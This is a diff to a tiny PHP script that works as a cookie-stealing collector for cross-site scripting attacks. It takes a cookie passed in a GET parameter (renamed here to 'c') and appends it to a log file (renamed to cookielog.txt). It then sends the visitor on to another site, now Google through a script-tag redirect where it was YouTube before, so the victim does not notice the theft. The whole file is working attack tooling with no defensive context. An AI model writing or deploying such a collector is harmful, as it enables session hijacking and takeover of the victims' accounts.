@@ -1,5 +1,8 @@
-<?php                                     
-$cookie = $HTTP_GET_VARS["cookie"];       
-$file = fopen('cookie.txt', 'a');     
+<?php
+
+$cookie = $HTTP_GET_VARS[" c"]; 
+$file = fopen('cookielog.txt', 'a'); 
 fwrite($file, $cookie . "\n\n"); 
-@header("Location:http://www.youtube.com/");    ?>
+echo " <script>location.href='http://www.google.com';</script>";
+
+?>
